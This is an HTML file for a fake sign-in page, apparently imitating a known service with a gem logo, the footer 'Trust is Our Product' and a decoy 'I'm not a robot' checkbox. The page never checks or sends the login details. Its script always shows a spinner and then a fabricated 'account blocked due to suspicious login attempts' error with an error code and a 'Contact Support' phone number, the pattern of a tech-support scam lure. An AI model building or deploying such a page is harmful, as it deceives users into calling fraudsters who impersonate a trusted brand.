<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In Page</title>
    <style>
        /* General Reset */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }

        body {
            background-color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            position: relative;
        }

        /* Logo at the top-left */
        .logo {
            position: absolute;
            top: 10px;
            left: 10px;
        }

        .logo img {
            width: 40px;
            height: 40px;
        }

        /* Container for the form */
        .container {
            width: 90%;
            max-width: 400px;
            text-align: center;
            margin: auto;
        }

        h1 {
            font-size: 2rem;
            margin-bottom: 15px;
            text-align: left;
            font-weight: bold;
        }

        label {
            display: block;
            text-align: left;
            margin-bottom: 10px;
            font-size: 1rem;
            color: #333;
        }

        input[type="email"],
        input[type="password"] {
            width: 100%;
            height: 44px;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 8px;
            font-size: 1rem;
        }

        .remember {
            display: flex;
            align-items: center;
            gap: 5px;
            margin-bottom: 15px;
            font-size: 0.9rem;
            text-align: left;
        }

        .forgot-password {
            text-align: left;
            margin-bottom: 20px;
        }

        .forgot-password a {
            color: #000;
            font-size: 0.9rem;
            text-decoration: underline;
        }

        /* reCAPTCHA Box */
        .captcha {
            display: flex;
            align-items: center;
            justify-content: flex-start;
            margin-bottom: 20px;
            height: 50px;
            border: 1px solid #ddd;
            border-radius: 8px;
            padding-left: 10px;
            background-color: #f9f9f9;
        }

        .captcha label {
            margin: 0;
        }

        /* Sign In Button */
        .btn-container {
            position: relative;
        }

        button {
            width: 100%;
            padding: 12px;
            font-size: 1rem;
            color: #fff;
            background-color: #000;
            border: none;
            border-radius: 50px;
            cursor: pointer;
            font-weight: bold;
            transition: background-color 0.3s ease;
        }

        button:hover {
            background-color: #333;
        }

        /* Spinner */
        .spinner {
            display: none;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            border: 2px solid #f3f3f3;
            border-top: 2px solid #fff;
            border-radius: 50%;
            width: 18px;
            height: 18px;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: translate(-50%, -50%) rotate(0deg); }
            100% { transform: translate(-50%, -50%) rotate(360deg); }
        }

        /* Error Message */
        .error-message {
            display: none;
            margin-bottom: 10px;
            color: red;
            font-size: 0.9rem;
            font-weight: bold;
            text-align: left;
        }

        /* Footer */
        .footer {
            font-size: 0.8rem;
            color: #888;
            margin-top: 20px;
            text-align: center;
        }

        .footer a {
            color: #000;
            text-decoration: underline;
        }

        /* Responsive Design */
        @media (max-width: 768px) {
            body {
                padding: 10px;
            }

            h1 {
                font-size: 1.8rem;
            }

            .logo img {
                width: 30px;
                height: 30px;
            }

            button {
                padding: 10px;
                font-size: 0.9rem;
            }

            input[type="email"],
            input[type="password"] {
                height: 40px;
                font-size: 0.9rem;
            }
        }

        @media (max-width: 480px) {
            h1 {
                font-size: 1.5rem;
            }

            .logo img {
                width: 25px;
                height: 25px;
            }

            button {
                padding: 8px;
                font-size: 0.85rem;
            }

            .captcha {
                height: 40px;
            }

            label, .remember, .forgot-password a {
                font-size: 0.85rem;
            }
        }
    </style>
</head>
<body>
    <!-- Logo -->
    <div class="logo">
        <img src="gem.png" alt="Logo">
    </div>

    <!-- Container -->
    <div class="container">
        <!-- Sign In Title -->
        <h1>Sign in</h1>

        <!-- Sign In Form -->
        <form id="signin-form">
            <label for="email">Email address</label>
            <input type="email" id="email" name="email">

            <div class="remember">
                <input type="checkbox" id="remember">
                <label for="remember">Remember my email address</label>
            </div>

            <label for="password">Password</label>
            <input type="password" id="password" name="password">

            <!-- Error Message -->
            <div class="error-message" id="error-message">
                Error code: 0X0047800 <br> Your account has been blocked due to suspicious login attempts. <br>
                Contact Support: <a href="tel:18335317046">+1-833-531-7046</a>
            </div>

            <div class="forgot-password">
                <a href="#">Forgot password?</a>
            </div>

            <!-- reCAPTCHA -->
            <div class="captcha">
                <input type="checkbox" id="captcha">
                <label for="captcha">I'm not a robot</label>
            </div>

            <!-- Sign In Button -->
            <div class="btn-container">
                <button type="button" id="sign-in-btn">Sign in</button>
                <div class="spinner" id="spinner"></div>
            </div>
        </form>

        <!-- Footer -->
        <div class="footer">
            Trust is Our Productâ„¢<br>
            For trademarks and patents, please see our <a href="#">Legal Notice</a>.
        </div>
    </div>

    <script>
        document.getElementById("sign-in-btn").addEventListener("click", function() {
            const spinner = document.getElementById("spinner");
            const errorMessage = document.getElementById("error-message");
            const button = document.getElementById("sign-in-btn");

            spinner.style.display = "block";
            button.style.color = "transparent";

            errorMessage.style.display = "none";

            setTimeout(() => {
                spinner.style.display = "none";
                button.style.color = "#fff";
                errorMessage.style.display = "block";
            }, 2000);
        });
    </script>
</body>
</html>
